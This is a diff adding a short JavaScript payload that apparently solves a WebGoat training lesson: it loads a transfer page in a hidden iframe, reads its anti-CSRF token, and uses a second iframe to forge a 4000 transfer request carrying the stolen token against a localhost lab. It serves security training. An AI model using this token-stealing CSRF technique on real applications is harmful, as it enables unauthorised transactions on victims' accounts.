@@ -1,0 +1,25 @@
+<script>
+    // Second iframe where the malicious request will be loaded
+    const stage2 = document.createElement('iframe');
+    stage2.id = 'stage2';
+    document.body.appendChild(stage2);
+
+    // First iframe where we get the token from
+    const stage1 = document.createElement('iframe');
+    stage1.id = 'stage1';
+    // Point it to the legitimate “transfer=main” page
+    stage1.src = 'http://localhost:8030/WebGoat/attack?Screen=907563375&menu=900&transfer=main';
+    document.body.appendChild(stage1);
+
+    // Function for stealing the token and updates stage2
+    function getToken() {
+        const doc = stage1.contentDocument;
+        const token = doc.getElementsByName('token')[0].value;
+        stage2.src = `http://localhost:8030/WebGoat/attack?Screen=907563375&menu=900&transfer=4000&token=${token}`;
+    }
+
+    // After stage1 loads, give it a short delay, then grab the token
+    stage1.onload = () => {
+        setTimeout(getToken, 100);
+    };
+</script>
